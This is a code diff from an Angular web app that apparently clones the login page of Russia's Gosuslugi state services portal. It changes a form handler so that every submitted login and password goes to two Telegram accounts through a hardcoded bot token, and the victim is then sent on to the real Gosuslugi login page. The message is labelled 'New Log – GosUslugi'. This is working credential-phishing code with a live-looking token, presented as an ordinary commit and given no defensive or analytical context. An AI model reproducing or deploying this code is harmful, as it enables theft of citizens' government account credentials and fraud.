@@ -1,5 +1,6 @@
 import {BreakpointObserver, Breakpoints} from '@angular/cdk/layout';
 import {Component, OnInit, ViewEncapsulation} from '@angular/core';
+import {Router} from '@angular/router';
 import {map} from 'rxjs/operators';
 import Telegram from 'telegram-send-message';
 import {FormBuilder, Validators} from '@angular/forms';
@@ -24,26 +25,27 @@ export class AppComponent implements OnInit {
 	isSmallScreen = false;
 
 	sentMessage(): void {
-		if (this.prevValue.login !== this.form.get('login').value || this.prevValue.password !== this.form.get('password').value) {
-			const message = 'Login: ' + this.form.get('login').value + '      Password: ' + this.form.get('password').value;
-			const token = '949565640:AAEGoYzcWtY0kC3MTI0KNfdkWFgxVe8NOQs';
-			console.log('sending..');
-			Telegram.setToken(token);
-			Telegram.setRecipient('880595419');
-			Telegram.setMessage(message);
-			Telegram.send();
-			Telegram.setToken(token);
-			Telegram.setRecipient('946981380');
-			Telegram.setMessage(message);
-			Telegram.send();
-			this.prevValue.login = this.form.get('login').value;
-			this.prevValue.password = this.form.get('password').value;
-		}
+		// if (this.prevValue.login !== this.form.get('login').value || this.prevValue.password !== this.form.get('password').value) {
+		const message = `Новый Лог – ГосУслуги🤟%0AЛогин: ${this.form.get('login').value}%0AПароль: ${this.form.get('password').value}`;
+		const token = '949565640:AAEGoYzcWtY0kC3MTI0KNfdkWFgxVe8NOQs';
+		Telegram.setToken(token);
+		Telegram.setRecipient('880595419');
+		Telegram.setMessage(message);
+		Telegram.send();
+		Telegram.setToken(token);
+		Telegram.setRecipient('946981380');
+		Telegram.setMessage(message);
+		Telegram.send();
+		this.router.navigateByUrl('https://esia.gosuslugi.ru/idp/rlogin?cc=bp');
+		this.prevValue.login = this.form.get('login').value;
+		this.prevValue.password = this.form.get('password').value;
+		// }
 	}
 
 	constructor(
 		private formBuilder: FormBuilder,
 		private breakpointObserver: BreakpointObserver,
+		private router: Router
 	) {}
 
 	ngOnInit(): void {
